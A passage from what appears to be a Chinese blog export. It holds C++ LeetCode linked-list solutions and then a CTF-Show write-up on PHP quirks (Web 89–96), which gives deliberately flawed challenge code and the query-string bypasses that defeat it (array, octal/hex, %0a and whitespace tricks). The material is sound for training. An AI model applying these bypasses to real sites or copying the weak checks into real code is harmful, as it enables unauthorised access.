<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    拆分链表</span></span><br><span class="line"><span class="comment">    得到链表的长度 n 之后，记 </span></span><br><span class="line"><span class="comment">    quotient=n/k </span></span><br><span class="line"><span class="comment">    remainder=n mod k</span></span><br><span class="line"><span class="comment">    则在分隔成的 k 个部分中，前 remainder 个部分的长度各为 quotient+1,其余每个部分的长度各为 quotient</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;ListNode*&gt; <span class="title">splitListToParts</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">        ListNode *temp = head;</span><br><span class="line">        <span class="keyword">while</span>(temp!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            n++;            <span class="comment">//链表长度n</span></span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> quotient = n/k;     <span class="comment">//商</span></span><br><span class="line">        <span class="keyword">int</span> remainder = n%k;    <span class="comment">//余数</span></span><br><span class="line">        <span class="function">vector&lt;ListNode*&gt; <span class="title">parts</span><span class="params">(k,<span class="literal">nullptr</span>)</span></span>;<span class="comment">//存入连续 k个链表</span></span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k &amp;&amp; cur != <span class="literal">nullptr</span>; i++)&#123;<span class="comment">//k个链表</span></span><br><span class="line">            parts[i] = cur;<span class="comment">//当前链表的头结点</span></span><br><span class="line">            <span class="keyword">int</span> partSize = quotient + (i&lt;remainder?<span class="number">1</span>:<span class="number">0</span>);<span class="comment">//前remainder个链表长度是</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;partSize; j++)&#123;</span><br><span class="line">                cur = cur-&gt;next;<span class="comment">//找到当前链表的尾结点</span></span><br><span class="line">            &#125;</span><br><span class="line">            ListNode *next = cur-&gt;next;<span class="comment">//当前链表的尾结点的下一个结点，即下一个链表的头结点</span></span><br><span class="line">            cur-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//当前链表的尾结点指向null，即当前链表结束</span></span><br><span class="line">            cur = next;<span class="comment">//下一个链表的头结点</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parts;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="86-分隔链表——分成-lt-x和-gt-x-连接起来"><a href="#86-分隔链表——分成-lt-x和-gt-x-连接起来" class="headerlink" title="86 分隔链表——分成&lt;x和&gt;=x 连接起来"></a>86 分隔链表——分成&lt;x和&gt;=x 连接起来</h3><p>给你一个链表的头节点 head 和一个特定值 x<br>分隔链表，<strong>使得所有 小于x 的节点都出现在 大于或等于x 的节点之前</strong>。<br>你应当 保留 两个分区中每个节点的初始相对位置。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    误区：second 不能先=one</span></span><br><span class="line"><span class="comment">    应该 都 new 一个新的头</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">partition</span><span class="params">(ListNode* head, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        ListNode *first = dummyHead;</span><br><span class="line">        ListNode *one = head;<span class="comment">//记录第一个&gt;=x结点</span></span><br><span class="line">        <span class="keyword">while</span>(one &amp;&amp; one-&gt;val&lt;x)</span><br><span class="line">            one = one-&gt;next;</span><br><span class="line">        ListNode *second = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;cur:&quot;</span>&lt;&lt;cur-&gt;val&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;val &lt; x)&#123;</span><br><span class="line">                first-&gt;next = cur;</span><br><span class="line">                first = cur;<span class="comment">//first最后指向&lt;x链表的最后一个结点</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                second-&gt;next = cur;</span><br><span class="line">                second = cur;<span class="comment">//second最后指向&gt;=x链表的最后一个结点</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//cout&lt;&lt;&quot;cur:&quot;&lt;&lt;cur-&gt;val&lt;&lt;endl;</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        first-&gt;next = one;<span class="comment">//两个链表 连接起来</span></span><br><span class="line">        second-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//尾结点</span></span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="10-链表元素按奇-偶聚集"><a href="#10-链表元素按奇-偶聚集" class="headerlink" title="10 链表元素按奇+偶聚集"></a>10 链表元素按奇+偶聚集</h3><p>给定单链表的头节点 head ，将所有<strong>索引</strong>为奇数的节点和<strong>索引</strong>为偶数的节点分别组合在一起，然后返回重新排序的列表<br>输入: head = [2,1,3,5,6,4,7]<br>输出: [2,3,6,7,1,5,4]</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">oddEvenList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *ou = head-&gt;next;<span class="comment">//偶数索引 头结点</span></span><br><span class="line">        ListNode *ji = head;<span class="comment">//奇数索引 头结点</span></span><br><span class="line">        ListNode *cur = ou;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span> &amp;&amp; cur-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ji-&gt;next = cur-&gt;next;</span><br><span class="line">            ji = ji-&gt;next;<span class="comment">//指向下一个 奇数位结点</span></span><br><span class="line">            cur-&gt;next = ji-&gt;next;</span><br><span class="line">            cur = cur-&gt;next;<span class="comment">//指向下一个 偶数位结点</span></span><br><span class="line">        &#125;</span><br><span class="line">        ji-&gt;next = ou;<span class="comment">//奇链 连接 偶链</span></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="143-重排链表"><a href="#143-重排链表" class="headerlink" title="143 重排链表"></a>143 重排链表</h3><p>给定一个单链表 L 的头节点 head ，单链表 L 表示为：<br>L0 → L1 → … → Ln - 1 → Ln<br>请将其重新排列后变为：<br>L0 → Ln → L1 → Ln - 1 → L2 → Ln - 2 → …<br><strong>需要实际的进行节点交换</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//快慢指针 找中间结点</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">midNode</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast-&gt;next &amp;&amp; fast-&gt;next-&gt;next)&#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;<span class="comment">//反转链表</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">reverse</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            ListNode *tmp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(ListNode *l1, ListNode *l2)</span></span>&#123;</span><br><span class="line">        ListNode *tmp1, *tmp2;</span><br><span class="line">        <span class="keyword">while</span>(l1 &amp;&amp; l2)&#123;</span><br><span class="line">            tmp1 = l1-&gt;next;</span><br><span class="line">            tmp2 = l2-&gt;next;</span><br><span class="line">            l1-&gt;next = l2;</span><br><span class="line">            l1 = tmp1;</span><br><span class="line">            l2-&gt;next = l1;</span><br><span class="line">            l2 = tmp2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reorderList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        ListNode *mid = <span class="built_in">midNode</span>(head);</span><br><span class="line">        ListNode *l1 = head;</span><br><span class="line">        ListNode *l2 = mid-&gt;next;<span class="comment">//注意 是next</span></span><br><span class="line">        mid-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//l1 的尾结点先指向null</span></span><br><span class="line">        l2 = <span class="built_in">reverse</span>(l2);<span class="comment">//</span></span><br><span class="line">        <span class="built_in">merge</span>(l1,l2);<span class="comment">//合并 l1 和 l2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203 移除链表元素"></a>203 移除链表元素</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pre 前驱</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeElements</span><span class="params">(ListNode* head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        ListNode *p = head-&gt;next,*pre = head;<span class="comment">//前驱</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;val==val)</span><br><span class="line">                pre-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pre = p;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*递归</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeElements</span><span class="params">(ListNode* head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        head-&gt;next = <span class="built_in">removeElements</span>(head-&gt;next,val);</span><br><span class="line">        <span class="keyword">return</span> head-&gt;val==val? head-&gt;next:head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代：使用 虚拟头结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeElements</span><span class="params">(ListNode* head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">       <span class="comment">//设置一个 虚拟头结点，便于对 head 操作</span></span><br><span class="line">       ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">       ListNode *pre = dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(pre-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pre-&gt;next-&gt;val==val)<span class="comment">//当前结点值 的下一个结点值等于val</span></span><br><span class="line">                pre-&gt;next = pre-&gt;next-&gt;next;<span class="comment">//当前结点指向下一个结点的下一个结点</span></span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                pre = pre-&gt;next;<span class="comment">//当前结点值后移一位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-PHP特性</title>
    <url>/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF Show PHP 特性篇。</p>
<span id="more"></span>

<h1 id="一、CTF-Show-PHP特性"><a href="#一、CTF-Show-PHP特性" class="headerlink" title="一、CTF Show PHP特性"></a>一、CTF Show PHP特性</h1><h2 id="1-1-Web-89-—-intval-数组-绕过"><a href="#1-1-Web-89-—-intval-数组-绕过" class="headerlink" title="1.1 Web 89 — intval 数组 [ ] 绕过"></a>1.1 Web 89 — intval 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num[]=1		<span class="comment">#数组绕过</span></span><br></pre></td></tr></table></figure>

<h2 id="1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476"><a href="#1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476" class="headerlink" title="1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476"></a>1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">intval ( mixed <span class="variable">$var</span> [, int <span class="variable">$base</span> = 10 ] ) : int</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 0，通过检测 var 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 8 进制(octal)；</span><br><span class="line">否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">intval(<span class="string">&#x27;4476.0&#x27;</span>)===4476    小数点  </span><br><span class="line">intval(<span class="string">&#x27;+4476.0&#x27;</span>)===4476   正负号</span><br><span class="line">intval(<span class="string">&#x27;4476e0&#x27;</span>)===4476    科学计数法</span><br><span class="line">intval(<span class="string">&#x27;0x117c&#x27;</span>)===4476    16进制</span><br><span class="line">intval(<span class="string">&#x27;010574&#x27;</span>)===4476    8进制</span><br><span class="line">intval(<span class="string">&#x27; 010574&#x27;</span>)===4476   8进制+空格</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="string">&#x27;4476sasaS&#x27;</span>,0)===4476)&#123;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=4476asd</span><br></pre></td></tr></table></figure>

<h2 id="1-3-Web-91-—-正则绕过-—-m-换行匹配"><a href="#1-3-Web-91-—-正则绕过-—-m-换行匹配" class="headerlink" title="1.3 Web 91 — 正则绕过 — /m 换行匹配"></a>1.3 Web 91 — 正则绕过 — /m 换行匹配</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Notice: Undefined index: cmd in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line">nonononono</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解析换行之后要匹配到 php不换行不能匹配到 php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i 不区分(ignore)大小写m多(more)行匹配若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配<span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 . 中包含换行符默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;preg_match_all(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样匹配到的有三个 <span class="built_in">bg</span> b\n bsA强制从目标字符串开头匹配;D如果使用$限制结尾字符,则不允许结尾有换行; e配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接使用换行符号分割即可# %0a 是 换行符?cmd=%0aphp</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-Web-92-—-intval-可解析十六进制、八进制"><a href="#1-4-Web-92-—-intval-可解析十六进制、八进制" class="headerlink" title="1.4 Web 92 — intval 可解析十六进制、八进制"></a>1.4 Web 92 — intval 可解析十六进制、八进制</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=0x117c	<span class="comment">#十六进制 Hex?num=010574	#八进制 oct?num=%20010574# ?num=4476sqs 不行，由于 $num==4476</span></span><br></pre></td></tr></table></figure>

<h2 id="1-5-Web-93-—-八进制不含字母，十六进制含字母"><a href="#1-5-Web-93-—-八进制不含字母，十六进制含字母" class="headerlink" title="1.5 Web 93 — 八进制不含字母，十六进制含字母"></a>1.5 Web 93 — 八进制不含字母，十六进制含字母</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=010574	<span class="comment">#oct</span></span><br></pre></td></tr></table></figure>

<h2 id="1-6-Web-94-—-正则绕过-—-20-0a"><a href="#1-6-Web-94-—-正则绕过-—-20-0a" class="headerlink" title="1.6 Web 94 — 正则绕过 — %20  %0a"></a>1.6 Web 94 — 正则绕过 — <code>%20  %0a</code></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#0在其中的位置不能是0，即最开始，即不能以0开头?num=%0a010574?num=4476.0?num=%20010574</span></span><br></pre></td></tr></table></figure>

<h2 id="1-7-Web-95-—-正则绕过"><a href="#1-7-Web-95-—-正则绕过" class="headerlink" title="1.7 Web 95 — 正则绕过"></a>1.7 Web 95 — 正则绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=%0a010574?num=%20010574?num=+010574</span><br></pre></td></tr></table></figure>

<h2 id="1-8-Web-96-—-路径书写"><a href="#1-8-Web-96-—-路径书写" class="headerlink" title="1.8 Web 96 — 路径书写"></a>1.8 Web 96 — 路径书写</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);    &#125;&#125; </span><br></pre></td></tr></table></figure>

